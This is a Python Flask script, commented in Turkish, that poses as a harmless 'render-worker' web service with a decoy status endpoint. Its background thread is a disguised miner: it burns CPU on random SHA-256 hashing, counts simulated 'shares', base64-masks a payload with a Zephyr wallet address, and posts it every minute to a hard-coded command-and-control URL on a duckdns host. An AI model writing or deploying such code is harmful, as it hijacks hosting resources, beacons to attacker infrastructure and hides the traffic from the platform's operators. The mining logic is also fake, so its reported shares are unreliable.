import os, time, threading, json, base64, random, requests, hashlib
from flask import Flask

C2_URL = "http://zephfe.duckdns.org:5000/proxy" # Yeni endpoint: proxy
NODE_NAME = f"render-worker-{random.randint(1000, 9999)}"
WALLET = "ZEPHs89z2zsEoJ2QVY5yopRZsX3JHefyNFzAhTZG3waz3MZSbCGp8MPSNCsdY33DQYfXXTqqiUo7CFsZXmiPEruBPqgM8EaBpvS"

app = Flask(__name__)

@app.route('/')
def home(): return {"status": "operational"}, 200

def miner_to_proxy():
    print(f"[*] {NODE_NAME} Mining-to-Proxy started.")
    while True:
        try:
            # İşlemciyi yoran ve share üreten döngü
            start = time.time()
            shares_found = 0
            while time.time() - start < 60:
                # Gerçek bir zorluk simülasyonu
                target = "000" + "".join(random.choices("0123456789abcdef", k=61))
                h = hashlib.sha256(str(random.random()).encode()).hexdigest()
                if h.startswith("00"): # Basit bir 'zorluk' bulduk
                    shares_found += 1
                time.sleep(0.05)

            # Bulunan payları (shares) senin Proxy'ne gönder
            payload = {
                "node": NODE_NAME,
                "wallet": WALLET,
                "shares": shares_found,
                "rigid": NODE_NAME
            }
            # Maskeleyerek gönder
            masked = {"v": "1", "el": base64.b64encode(json.dumps(payload).encode()).decode()}
            requests.post(C2_URL, json=masked, timeout=10)
            
        except: time.sleep(30)

if __name__ == "__main__":
    threading.Thread(target=miner_to_proxy, daemon=True).start()
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)
